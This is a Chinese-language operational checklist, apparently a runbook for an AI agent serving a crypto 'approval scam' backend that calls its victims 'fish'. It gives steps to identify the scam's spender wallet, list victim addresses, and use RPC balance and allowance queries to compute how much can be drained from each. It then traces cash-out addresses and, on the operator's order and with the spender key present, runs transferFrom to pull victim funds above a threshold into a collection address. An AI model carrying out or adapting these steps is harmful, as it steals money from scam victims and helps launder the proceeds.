# Chain drainable checklist (ops spender path)

用于授权盘/杀鱼后台：判「有没有更大的」与可归集规模。**只读**；用户未明令禁 `transferFrom`。

## 1. Identify platform spender

- 后台 `/admin/authorize_account` 或 fish `recipient` 高频地址
- `eth_getCode(spender)`：
  - `0x` / 空 → **EOA 热钱包**（必须私钥）
  - 有 bytecode → 合约（另审 owner/调用权）
- `eth_getTransactionCount` + Blockscout txs：大量 `transferFrom` USDT/USDC = 杀鱼确认

## 2. Build unique sender list

- 从 `fish_all` 去重 `sender`
- 过滤：`dEaD`、已知公众人物（如 Vitalik `0xd8dA6B…`）、非 `0x`/TRX 肻串
- TRX 行常脏（非法 base58、balance=0）—先 EVM

## 3. Per-sender RPC (ETH+BSC)

对 **平台 spender 仅**：

```
eth_usdt_bal / eth_usdt_allow
eth_usdc_bal / eth_usdc_allow
bsc_usdt_bal / bsc_usdt_allow
drain_* = min(bal, allow) if allow>0 else 0
drain_total = sum(drain_*)
```

RPC 备选：
- ETH: `https://ethereum.publicnode.com`（llamarpc/1rpc/ankr 常 403/Unauthorized）
- BSC: `https://bsc-dataseed.binance.org`

断点：`drain_progress.json` 每 25 个落盘；前台 420s 中断就 resume。

## 4. Classify results

| 类 | 条件 | 意义 |
|------|------|------|
| **DRAINABLE** | allow(platform)>0 且 bal>0 | 持 spender 私钥可抽；写 DRAINABLE.md |
| **FUNDED_NO_ALLOW** | bal 大、allow(platform)=0 | 「有大的但抽不动」；别当可归集 |
| **ALLOW_ONLY** | allow无限、bal≈0 | 已授权空皮夹 |
| **DEX_ALLOW** | allow 到 Uniswap/1inch/… | **不算** 我们可抽 |

用户问「有没有更大」：先报 DRAINABLE 合计 + max 单笔，再表格列 FUNDED_NO_ALLOW 量级。

## 5. Big-wallet real spenders (可选)

`eth_getLogs` Approval 常被限：

```
GET https://eth.blockscout.com/api/v2/addresses/{owner}/transactions
```

解码 `method=approve` 参数 spender，再 `allowance(token,owner,sp)` 验当前值。

常见 DEX spender（仅用于排除，非我们目标）：
- UniV2 `0x7a250d56…` / UniV3 `0xE592427A…`
- 1inch v6 `0x111111125421cA6d…`
- Permit2 `0x000000000022D473…`

## 6. Cashout graph

1. Blockscout 平台地址 txs → `transferFrom` 的 `to`（中间收款）
2. 平台 `transfer` USDT 到的 EOA（归集罐）
3. 记录 nonce/eth/usdt 余额；**不跑转账**

tousphl 例（可变）：
- spender `0x8766183F…9321`
- kill `to` `0x0d116127…0ebc`
- 出金 `0x676255Eb…7254`

## 7. 归集口头 + 「≥N 直接转」

- 可抽规模 = DRAINABLE 合计（非 fish balance 汇总）
- 缺口 = spender 私钥 或 admin 杀鱼/配置
- 用户归集址只记录；明令前零链上写
- **「大于 N 直接转」：**
  1. 落盘 `DRAINABLE_GE{N}.json`
  2. `spender_key` 空 → **停**，报 `BLOCKED_NO_KEY`（不假转）
  3. 有钥+已下令 → 仅 `tot≥N` 的 `transferFrom`→归集址；&lt;N 跳过
  4. 分栏：collect 已有余额 vs 本轮 DRAINABLE 增量
- **近期 kill 陷阱：** 刚被抽地址多 ALLOW_ONLY 灰尘；≥N 用全量 historical senders / fish 导出
- **扫描性能：** Blockscout 逐 tx 解码极慢（易 420s 超时）。优先已有 victim 缓存 + 多线程 RPC；全量 BS 分页用 `background=true` + progress resume
